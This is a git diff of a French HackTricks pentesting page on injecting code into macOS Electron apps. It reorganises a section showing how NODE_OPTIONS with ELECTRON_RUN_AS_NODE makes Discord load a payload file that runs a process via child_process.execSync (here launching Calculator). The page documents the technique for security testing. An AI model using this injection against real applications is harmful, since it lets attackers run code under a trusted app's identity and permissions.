@@ -12,14 +12,30 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 {% endcode %}
 
 {% hint style="danger" %}
-Notez que la plupart des applications Electron ignoreront désormais les paramètres node (tels que --inspect) lorsqu'elles sont lancées, sauf si la variable d'environnement **`ELECTRON_RUN_AS_NODE`** est définie.
+Notez que maintenant les applications Electron **renforcées** ignoreront les paramètres de noeud (tels que --inspect) lorsqu'elles sont lancées à moins que la variable d'environnement **`ELECTRON_RUN_AS_NODE`** ne soit définie.
 
 Cependant, vous pouvez toujours utiliser le paramètre electron `--remote-debugging-port=9229`, mais la charge utile précédente ne fonctionnera pas pour exécuter d'autres processus.
 {% endhint %}
 
+## `NODE_OPTIONS`
+
+{% hint style="warning" %}
+Cette variable d'environnement ne fonctionnerait que si l'application Electron n'a pas été correctement renforcée et l'autorise. Si elle est renforcée, vous devrez également utiliser la **variable d'environnement `ELECTRON_RUN_AS_NODE`**.
+{% endhint %}
+
+Avec cette combinaison, vous pouvez stocker la charge utile dans un fichier différent et exécuter ce fichier:
+
+{% code overflow="wrap" %}
+```bash
+# Content of /tmp/payload.js
+require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Ca$
+
+# Execute
+NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
+```
 ## `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>
 
-Selon [**la documentation**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), si cette variable d'environnement est définie, elle démarrera le processus en tant que processus Node.js normal. 
+Selon [**la documentation**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), si cette variable d'environnement est définie, elle démarrera le processus en tant que processus Node.js normal.
 
 {% code overflow="wrap" %}
 ```bash
@@ -54,28 +70,14 @@ Comme [**proposé ici**](https://www.trustedsec.com/blog/macos-injection-via-thi
 </dict>
 </plist>
 ```
-### `ELECTRON_RUN_AS_NODE` & `NODE_OPTIONS` &#x20;
-
-Avec cette combinaison, vous pouvez stocker la charge utile dans un fichier différent et exécuter ce fichier :
-
-{% code overflow="wrap" %}
-```bash
-# Content of /tmp/payload.js
-require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Ca$
-
-# Execute
-NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
-```
-{% endcode %}
-
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre entreprise annoncée dans HackTricks ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live).
 * **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
